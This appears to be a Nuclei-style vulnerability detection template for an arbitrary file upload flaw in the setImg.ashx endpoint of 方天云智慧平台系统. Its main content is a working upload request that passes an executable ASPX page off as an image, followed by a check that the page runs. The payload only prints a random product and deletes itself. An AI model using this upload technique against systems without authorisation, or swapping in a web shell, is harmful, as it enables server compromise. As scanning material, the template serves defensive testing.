id: poc-yaml-ftyerp-setImg-upload

info:
  name: 方天云智慧平台系统setImg.ashx存在文件上传漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 文件上传
  description: |
    Detects a file upload vulnerability in 方天云智慧平台系统 where the setImg.ashx endpoint allows uploading and execution of arbitrary files.

variables:
  t1: "{{rand_int(100,1000)}}"
  t2: "{{rand_int(100,1000)}}"
  t3: "{{to_number(t1) * to_number(t2)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/Data/setImg.ashx"
    headers:
      X-Requested-With: "XMLHttpRequest"
      Content-Type: "multipart/form-data; boundary=----21909179191068471382830692394"
    body: |
      ------21909179191068471382830692394
      Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
      Content-Type: image/jpeg
      
      <%@ Page Language="Jscript" validateRequest="false" %>
      This website has a vulnerability
      <%Response.Write({{t1}} * {{t2}});System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
      ------21909179191068471382830692394--
    matchers:
      - type: regex
        part: body
        regex:
          - "(?P<filepath>.*?).aspx"
    extractors:
      - type: regex
        name: filepath
        part: body
        regex:
          - "(?P<filepath>.*?).aspx"
        internal: true

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/UploadFile/CustomerFile/{{filepath}}.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "This website has a vulnerability"
          - "{{t3}}"
